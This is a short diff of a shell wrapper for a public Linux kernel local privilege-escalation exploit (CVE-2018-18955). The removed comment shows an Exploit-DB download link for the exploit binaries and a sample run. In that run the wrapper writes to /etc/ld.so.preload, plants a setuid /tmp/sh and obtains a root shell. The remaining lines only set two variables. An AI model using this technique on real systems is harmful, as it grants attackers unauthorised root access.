@@ -1,27 +1,3 @@
-#!/bin/sh
-#
-# EDB Note: Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47166.zip
-#
-# wrapper for Jann Horn's exploit for CVE-2018-18955
-# uses ld.so.preload technique
-# ---
-# test@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955$ ./exploit.ldpreload.sh
-# [*] Compiling...
-# [*] Adding libsubuid.so to /etc/ld.so.preload...
-# [.] starting
-# [.] setting up namespace
-# [~] done, namespace sandbox set up
-# [.] mapping subordinate ids
-# [.] subuid: 165536
-# [.] subgid: 165536
-# [~] done, mapped subordinate ids
-# [.] executing subshell
-# [+] Success:
-# -rwsrwxr-x 1 root root 8384 Nov 21 19:07 /tmp/sh
-# [*] Launching root shell: /tmp/sh
-# root@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955# id
-# uid=0(root) gid=0(root) groups=0(root),1001(test)
-
 rootshell="/tmp/sh"
 lib="libsubuid.so"
 
